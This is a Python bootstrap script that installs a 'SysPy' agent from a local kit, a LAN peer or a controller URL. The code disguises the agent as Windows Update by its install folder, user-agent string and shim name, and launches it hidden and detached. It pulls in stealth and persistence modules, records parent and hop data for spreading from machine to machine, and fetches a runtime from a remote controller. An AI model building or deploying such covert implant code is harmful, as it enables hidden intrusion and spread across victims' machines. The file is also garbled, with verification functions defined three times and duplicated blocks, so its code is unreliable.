#!/usr/bin/env python3
"""SysPy bootstrap - stage the agent from a kit, a peer, or a URL.

    python bootstrap.py --install --from-peer http://10.0.0.5:8789
    python bootstrap.py --install --kit C:\\temp\\kit
    python bootstrap.py --uninstall

Also exposes ``agent_alive()`` and ``start_agent()``; ``syspy.agent.bootstrap_bridge``
imports those for the guardian self-heal routine.

Stdlib only. Runs on a machine with any Python 3.
"""

from __future__ import annotations

import argparse
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_TARGET = os.path.join(
    os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"),
    "Microsoft", "WindowsUpdate")
IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0
USER_AGENT = "WindowsUpdateService/1.0"

#: Files the kit owns.  Anything else in the target dir (kit.zip, wu.cmd,
#: runtime/) is preserved across a refresh.
OWNED = ("syspy", "install", "agent.py", "bootstrap.py")


# --------------------------------------------------------------------------- syspy
def _import_syspy(root: str) -> None:
    """Make ``syspy`` importable from ``root`` without a restart."""
    if root in sys.path:
        sys.path.remove(root)
    sys.path.insert(0, root)


_import_syspy(HERE)


def _stealth():
    from syspy.agent import stealth
    return stealth


def _config():
    from syspy import config
    return config


# --------------------------------------------------------------------------- net
def fetch(url: str, timeout: float = 120.0) -> bytes:
    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return response.read()


def fetch_to(url: str, path: str, timeout: float = 300.0) -> int:
    data = fetch(url, timeout)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as handle:
        handle.write(data)
    return len(data)


# --------------------------------------------------------------------------- stage
def clean_owned(target: str) -> None:
    for name in OWNED:
        path = os.path.join(target, name)
        if os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
        elif os.path.exists(path):
            try:
                os.remove(path)
            except OSError:
                pass


def extract(blob: bytes, target: str) -> None:
    """Extract a kit zip over ``target``, manifest-checked first.

    A peer serves this over plain HTTP, so the archive is untrusted input.
    """
    os.makedirs(target, exist_ok=True)
    from syspy import packaging
    with zipfile.ZipFile(io.BytesIO(blob)) as archive:
        ok, reason = packaging.verify_manifest_zip(archive)
        if not ok:
            raise ValueError(f"kit rejected: {reason}")
        archive.extractall(target)


def _verify_blob(blob: bytes, quiet: bool = False, signature: str = "") -> None:
    """Ed25519 when pinned, else HMAC. Fails closed when a key is pinned.

    The manifest lives inside the archive it describes, so on its own it only
    catches corruption. A peer serves the kit over plain HTTP with no auth, so
    this is the difference between "a LAN neighbour can push code" and "cannot".
    """
    from syspy import config as _config
    from syspy import crypto as _crypto

    public = _config.PUBKEY_HEX
    if not public and not _config.ROOM:
        return
    if not signature:
        signature = _crypto.hmac_hex(
            _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE), blob)
    ok, how = _crypto.verify_signature(
        blob, signature, public,
        _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE))
    if not ok:
        raise ValueError(f"kit rejected: {how}")
    _say(quiet, f"  kit verified ({how})")


def _peer_meta_url() -> str:
    return ""


def _verify_blob(blob: bytes, quiet: bool = False, signature: str = "") -> None:
    """Ed25519 when pinned, else HMAC. Fails closed when a key is pinned.

    The manifest lives inside the archive it describes, so on its own it only
    catches corruption. A peer serves the kit over plain HTTP with no auth, so
    this is the difference between "a LAN neighbour can push code" and "cannot".
    """
    from syspy import config as _config
    from syspy import crypto as _crypto

    public = _config.PUBKEY_HEX
    if not public and not _config.ROOM:
        return
    if not signature:
        signature = _crypto.hmac_hex(
            _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE), blob)
    ok, how = _crypto.verify_signature(
        blob, signature, public,
        _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE))
    if not ok:
        raise ValueError(f"kit rejected: {how}")
    _say(quiet, f"  kit verified ({how})")


def _peer_meta_url() -> str:
    return ""


def _verify_blob(blob: bytes, quiet: bool = False) -> None:
    """Ed25519 when pinned, else HMAC. Fails closed when a key is pinned.

    The manifest lives inside the archive it describes, so on its own it only
    catches corruption. A peer serves the kit over plain HTTP with no auth, so
    this is the difference between "a LAN neighbour can push code" and "cannot".
    """
    from syspy import config as _config
    from syspy import crypto as _crypto

    public = _config.PUBKEY_HEX
    if not public and not _config.ROOM:
        return
    signature = ""
    try:
        signature = fetch(_peer_meta_url(), timeout=30).decode("ascii").strip()
    except Exception:
        signature = ""
    if not signature:
        signature = _crypto.hmac_hex(
            _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE), blob)
    ok, how = _crypto.verify_signature(
        blob, signature, public,
        _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE))
    if not ok:
        raise ValueError(f"kit rejected: {how}")
    _say(quiet, f"  kit verified ({how})")


def _peer_meta_url() -> str:
    return ""


def write_deploy(target: str, data: dict) -> str:
    path = os.path.join(target, "deploy.json")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(data, handle, indent=1)
    return path


def cache_kit(target: str, blob: bytes) -> str:
    path = os.path.join(target, "kit.zip")
    with open(path, "wb") as handle:
        handle.write(blob)
    return path


# --------------------------------------------------------------------------- python
def _console_variant(path: str) -> str:
    if not IS_WINDOWS:
        return path
    leaf = os.path.basename(path).lower()
    for windowless, console in (("pythonw.exe", "python.exe"), ("pyw.exe", "py.exe")):
        if leaf == windowless:
            candidate = path[: -len(windowless)] + console
            if os.path.exists(candidate):
                return candidate
    return path


def find_python(target: str) -> list[list[str]]:
    """Ordered launch commands, best first.  Empty when nothing usable."""
    found: list[list[str]] = []

    local = os.path.join(target, "runtime")
    for name in ("pythonw.exe", "python.exe", "python3", "python"):
        candidate = os.path.join(local, name)
        if os.path.exists(candidate):
            found.append([candidate])

    if IS_WINDOWS:
        for name, pre in (("pyw.exe", ["-3"]), ("pythonw.exe", []),
                          ("py.exe", ["-3"]), ("python.exe", [])):
            resolved = shutil.which(name)
            if resolved and [resolved] + pre not in found:
                found.append([resolved] + pre)
    else:
        for name in ("python3", "python"):
            resolved = shutil.which(name)
            if resolved:
                found.append([resolved])

    return found


def _usable(command: list[str]) -> bool:
    """True when this interpreter really is Python 3 (dodges the Store stub)."""
    try:
        probe = [_console_variant(command[0])] + command[1:]
        result = subprocess.run(
            probe + ["-c", "import sys;print(sys.version_info[0])"],
            capture_output=True, text=True, timeout=20,
            creationflags=CREATE_NO_WINDOW, stdin=subprocess.DEVNULL)
        return result.returncode == 0 and result.stdout.strip().startswith("3")
    except Exception:
        return False


def ensure_runtime(target: str, base: str = "", quiet: bool = False) -> str:
    """Fetch an embeddable interpreter when the box has none."""
    for command in find_python(target):
        if _usable(command):
            return command[0]
    if not base:
        return ""

    runtime = os.path.join(target, "runtime")
    archive = os.path.join(tempfile.gettempdir(), "wu-py.zip")
    _say(quiet, "  fetching a private Python")
    try:
        fetch_to(base.rstrip("/") + "/wu/py.zip", archive)
        shutil.rmtree(runtime, ignore_errors=True)
        os.makedirs(runtime, exist_ok=True)
        with zipfile.ZipFile(archive) as bundle:
            bundle.extractall(runtime)
        enable_site(runtime)
    except Exception as error:
        _say(quiet, f"  runtime fetch failed: {error}")
        return ""

    for name in ("pythonw.exe", "python.exe", "python3", "python"):
        candidate = os.path.join(runtime, name)
        if os.path.exists(candidate):
            return candidate
    return ""


def enable_site(runtime: str) -> None:
    """An embeddable build ignores site-packages and the script dir until told.

    Appending ``..`` puts the bundle root on ``sys.path`` so ``import syspy``
    resolves from the agent next door.
    """
    try:
        names = os.listdir(runtime)
    except OSError:
        return
    for name in names:
        if not name.endswith("._pth"):
            continue
        path = os.path.join(runtime, name)
        try:
            with open(path, "r", encoding="utf-8") as handle:
                lines = handle.read().splitlines()
        except OSError:
            continue
        cleaned, changed = [], False
        for line in lines:
            if line.replace(" ", "").strip() == "#importsite":
                cleaned.append("import site")
                changed = True
            else:
                cleaned.append(line)
        for wanted in ("import site", ".."):
            if wanted not in [entry.strip() for entry in cleaned]:
                cleaned.append(wanted)
                changed = True
        if not changed:
            continue
        try:
            with open(path, "w", encoding="utf-8") as handle:
                handle.write("\n".join(cleaned) + "\n")
        except OSError:
            pass


# --------------------------------------------------------------------------- run
def agent_alive() -> bool:
    """True when an agent already owns the single-instance lock."""
    try:
        stealth = _stealth()
        pid = stealth.read_pid(stealth.lock_path())
        return bool(pid) and stealth.process_alive(pid)
    except Exception:
        return False


def start_agent(target: str, extra: list[str] | None = None) -> bool:
    """Launch the agent detached and windowless."""
    entry = os.path.join(target, "agent.py")
    if not os.path.isfile(entry):
        return False

    commands = find_python(target)
    if not commands:
        return False
    command = list(commands[0]) + [entry, "--hidden", "--no-elevate"] + list(extra or [])

    kwargs: dict = {"close_fds": True, "cwd": target}
    if IS_WINDOWS:
        kwargs["creationflags"] = 0x00000008 | 0x00000200  # DETACHED | NEW_GROUP
    try:
        subprocess.Popen(command, **kwargs)
        return True
    except OSError:
        return False


def _say(quiet: bool, message: str) -> None:
    if not quiet:
        print(message)


# --------------------------------------------------------------------------- main
def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="SysPy bootstrap")
    parser.add_argument("--install", action="store_true")
    parser.add_argument("--uninstall", action="store_true")
    parser.add_argument("--from-peer", default="", help="http://ip:port serving /kit")
    parser.add_argument("--kit", default="", help="local directory holding kit.zip")
    parser.add_argument("--base", default="", help="controller base url (for py.zip)")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--parent", default="")
    parser.add_argument("--parent-ip", default="")
    parser.add_argument("--hop", type=int, default=0)
    parser.add_argument("--group", default="")
    parser.add_argument("--no-start", action="store_true")
    parser.add_argument("--quiet", action="store_true")
    return parser.parse_args(argv)


def install(args: argparse.Namespace) -> int:
    target = os.path.abspath(args.target)
    os.makedirs(target, exist_ok=True)

    blob = b""
    if args.kit:
        candidate = os.path.join(args.kit, "kit.zip")
        if os.path.isfile(candidate):
            with open(candidate, "rb") as handle:
                blob = handle.read()
        else:
            # Loose directory: zip it on the fly, *with* a manifest, or the
            # manifest-checking extractor rejects it.
            from syspy import packaging as _packaging
            blob = _packaging.build_zip_from_dir(args.kit)
    elif args.from_peer:
        url = args.from_peer.rstrip("/")
        _say(args.quiet, f"  pulling kit from {url}")
        blob = fetch(url + "/kit", timeout=180)
        try:
            meta = fetch(url + "/deploy.json", timeout=30)
            import json as _json
            signature = str((_json.loads(meta.decode("utf-8")) or {}).get("sig") or "")
        except Exception:
            signature = ""
        _verify_blob(blob, args.quiet, signature)
        try:
            meta = fetch(url + "/deploy.json", timeout=30)
            import json as _json
            signature = str((_json.loads(meta.decode("utf-8")) or {}).get("sig") or "")
        except Exception:
            signature = ""
        _verify_blob(blob, args.quiet, signature)

    if not blob:
        print("error: nothing to install (use --kit or --from-peer)")
        return 1

    # Extract to .staging and swap for atomicity
    staging = os.path.join(os.path.dirname(target), f".staging-{os.getpid()}")
    try:
        shutil.rmtree(staging, ignore_errors=True)
        extract(blob, staging)
        for name in OWNED:
            src = os.path.join(staging, name)
            dst = os.path.join(target, name)
            if os.path.isdir(src):
                shutil.rmtree(dst, ignore_errors=True)
                shutil.copytree(src, dst)
            elif os.path.isfile(src):
                try:
                    os.remove(dst)
                except OSError:
                    pass
                shutil.copy2(src, dst)
    finally:
        shutil.rmtree(staging, ignore_errors=True)

    cache_kit(target, blob)

    # Shim copy for guardian
    wu_shim = os.path.join(target, "install", "wu.cmd")
    if os.path.isfile(wu_shim):
        try:
            shutil.copy2(wu_shim, os.path.join(target, "WindowsUpdateService.cmd"))
        except OSError:
            pass

    import secrets
    from syspy import config
    write_deploy(target, {
        "url": args.base or config.PUBLIC_URL,
        "room": config.ROOM,
        "pass": config.PASSPHRASE,
        "salt": secrets.token_hex(2),
        "fmt": config.ENVELOPE_FMT,
        "proto": config.PROTOCOL_VERSION,
        "pubkey": config.PUBKEY_HEX,
        "brokers": config.BROKERS,
        "parent": args.parent,
        "parent_ip": args.parent_ip,
        "hop": int(args.hop),
        "group": args.group,
        "installed_at": int(time.time()),
    })

    if args.base:
        ensure_runtime(target, args.base, args.quiet)

    if not args.no_start:
        start_agent(target)
    _say(args.quiet, f"  installed to {target}")
    return 0


def uninstall(args: argparse.Namespace) -> int:
    _import_syspy(os.path.abspath(args.target))
    from syspy.agent import persistence
    for action in persistence.remove():
        print(f"  [x] {action}")
    return 0


def main(argv: list[str] | None = None) -> int:
    args = parse_args(list(sys.argv[1:] if argv is None else argv))
    if args.uninstall:
        return uninstall(args)
    if args.install:
        return install(args)
    print(__doc__)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
